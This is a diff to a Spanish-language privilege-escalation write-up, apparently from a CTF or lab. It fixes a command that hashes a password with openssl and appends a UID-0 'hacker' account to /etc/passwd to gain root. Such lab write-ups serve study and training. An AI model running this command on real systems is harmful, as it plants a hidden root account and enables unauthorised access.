@@ -61,8 +61,7 @@ Ahora como no puedo editar el archivo voy a añadir directamente un usuario nuev
 
 ```bash
 openssl passwd password
-echo 'hacker:$1$OM6nPqQf$9TzDN//UqkfWpAZY7lZhL1:0:0::/home/hacker:/bin/bash
-' >> /etc/passwd
+echo 'hacker:$1$OM6nPqQf$9TzDN//UqkfWpAZY7lZhL1:0:0::/home/hacker:/bin/bash' >> /etc/passwd
 ```
 
 Ahora inicio sesión como el usuario que acabo de añadir y ya sería root.
